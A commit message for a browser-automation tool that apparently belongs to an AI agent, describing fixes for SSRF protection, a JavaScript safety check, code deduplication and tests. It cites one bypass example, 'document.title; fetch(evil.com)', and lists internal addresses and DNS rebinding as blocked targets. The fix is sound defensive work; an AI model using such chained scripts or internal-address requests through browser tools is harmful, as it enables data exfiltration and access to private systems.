fix(browser): address review findings — SSRF, DRY, exact-match JS guard
- Extract shared SSRF protection into _url_security.py; web_fetch and
  browser both import check_ssrf/is_private_ip from it (finding #1, #3 reuse)
- Extract _PlaywrightBrowserBase to _base.py with all shared page-interaction
  methods; LocalPlaywrightAdapter and BrowserbaseAdapter inherit from it,
  eliminating ~150 lines of duplication (finding #2, #3)
- Fix _is_safe_js to use exact match instead of startswith, preventing
  chained-expression bypasses like 'document.title; fetch(evil.com)' (finding #4)
- Fix _BrowserToolBase mutable default arg: use 'x if x is not None else []'
  instead of 'x or module_level_list' (finding #5)
- Add DNS+IP SSRF check to _validate_browser_url: blocks 127.0.0.1,
  10.0.0.1, ::1, 169.254.x.x and DNS rebinding attacks
- Add TestSsrfProtection test class and startswith-bypass test
- Patch socket.getaddrinfo in TestValidateBrowserUrl so DNS lookups are
  not required in unit tests
